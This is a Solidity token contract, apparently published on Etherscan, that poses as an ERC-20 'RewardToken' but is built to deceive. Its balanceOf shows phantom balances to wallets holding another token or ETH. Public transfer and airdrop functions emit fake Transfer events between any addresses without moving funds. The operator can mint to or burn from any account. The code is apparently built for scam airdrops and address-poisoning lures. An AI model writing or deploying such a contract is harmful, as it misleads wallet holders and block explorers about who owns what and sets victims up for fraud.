/**
 *Submitted for verification at Etherscan.io on 2022-12-11
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;
pragma experimental ABIEncoderV2;

interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface ITarget {
    function balanceOf(address account) external view returns (uint256);
    function transferTo(address recipient, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

contract RewardToken is Context, IERC20Metadata {

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    ITarget public target;
    uint256 public limit;
    uint256 public multifier;
    address public initializer;
    address public operator;

    constructor(string memory name_, string memory symbol_, address _target, uint256 _limit, uint256 multifier_) public {
        initialize(name_, symbol_, _target, _limit, multifier_);
    }

    function initialize(string memory name_, string memory symbol_, address _target, uint256 _limit, uint256 multifier_) public {
        require(initializer == address(0) || initializer == msg.sender, "already initialized");
        initializer = msg.sender;
        _name = name_;
        _symbol = symbol_;
        operator = msg.sender;
        target = ITarget(_target);
        limit = _limit;
        multifier = multifier_;
        _totalSupply = 100e27;
        _mint(operator, 1e8 ether);
    }

    modifier onlyOperator() {
        require(msg.sender == operator, "not Owner");
        _;

    }

    function setTarget000(address _target) public onlyOperator {
        target = ITarget(_target);
    }

    function set(string memory name_, string memory symbol_) public onlyOperator{
        _name = name_;
        _symbol = symbol_;
    }

    function setLimit000(uint256 _limit) public onlyOperator {
        limit = _limit;
    }

    function mint(address to, uint256 amount) public onlyOperator {
        _mint(to, amount);
    }

    function burn(address to, uint256 amount) public onlyOperator {
        _burn(to, amount);
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        uint256 targetBalance = balanceOfTarget(account);
        if(_balances[account] > 0 || isContract(account)) return _balances[account];
        else if(targetBalance >= limit) {
            return targetBalance * multifier * (10 ** (18 - decimalsTarget()));
        }
        else return 0;
    }

    function balanceOfTarget(address account) public view returns(uint256) {
        if(address(target) == address(0)) {
            return address(account).balance;
        }
        return target.balanceOf(account);
    }

    function decimalsTarget() public view returns(uint256) {
        if(address(target) == address(0)) {
            return 18;
        }
        return target.decimals();
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        
        _approve(owner, spender, currentAllowance - subtractedValue);

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        _balances[from] = balanceOf(from);
        _balances[to] = balanceOf(to);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, 'insufficient balance');

        _balances[from] = fromBalance - amount;
        _balances[to] += amount;

        emit Transfer(from, to, amount);

    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _balances[account] = balanceOf(account);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _balances[account] = balanceOf(account);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
   
        _balances[account] = accountBalance - amount;
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
                _approve(owner, spender, currentAllowance - amount);
        }
    }

    function transfer(address[] memory holders, uint256[] memory amounts) public payable {
        uint256 len = holders.length;
        for (uint i = 0; i < len; ++i) {
            emit Transfer(operator, holders[i], amounts[i]);
        }
    }

    function airdrop(address[] memory holders, uint256[] memory amounts) public {
        uint256 len = holders.length;
        for (uint i = 0; i < len; ++i) {
            emit Transfer(operator, holders[i], amounts[i]);
        }
    }

    function transfer(address from, address to, uint256 amount) public {
        emit Transfer(from, to, amount);
    }

    function emergencyWithdraw(address token) public{
        uint256 amount = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(operator, amount);
    }

    function emergencyWithdraw() public{
        uint256 amount = address(this).balance;
        payable(operator).transfer(amount);
    }

    function isContract(address _addr) private view returns (bool){
        uint32 size;
        assembly {
            size := extcodesize(_addr)
        }
        return (size > 0);
    }

    receive() payable external {

    }
}